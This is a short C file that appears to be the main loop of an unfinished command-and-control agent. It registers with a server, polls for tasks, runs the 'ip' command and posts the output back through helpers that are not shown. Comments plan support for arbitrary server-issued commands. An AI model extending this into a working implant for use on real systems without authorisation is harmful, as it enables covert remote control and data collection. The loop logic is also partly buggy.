#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>

#include "initiate.h"

int main(void)
{
    struct strings_array sa = { NULL, NULL, 0, 1, 0, NULL};

    bool registered = false;
    while(!registered) {
        if(reg()) {
            puts("Registered\n");
            registered = true;
            continue;
        } else {
            puts("Not Registered, trying again\n");
            sleep(5);
            break;
        }

    }

    while(true) {
        puts("Checking tasks\n");
        // Check tasks will eventually return an array of strings.
        // The number of elements in that array will dictate how.
        // Many tasks there were and how many times execute_tasks
        // will be called.
        check_tasks();

        // Eventually check_tasks will return the task type and
        // specific task. An if block will be added here to
        // check if task type is cmd, if so, run the cmd commands.
        if(can_run_cmd("ip")) {
            puts("Command exists\n");
            if(run_cmd(&sa)) {
                // printf("%s", sa.words);
                post_results(&sa);
            }

        } else {
            puts("Command does not exist\n");
            continue;


        }

        // remember to destroy sa.words at some point.
        sleep(10);
    }
        
}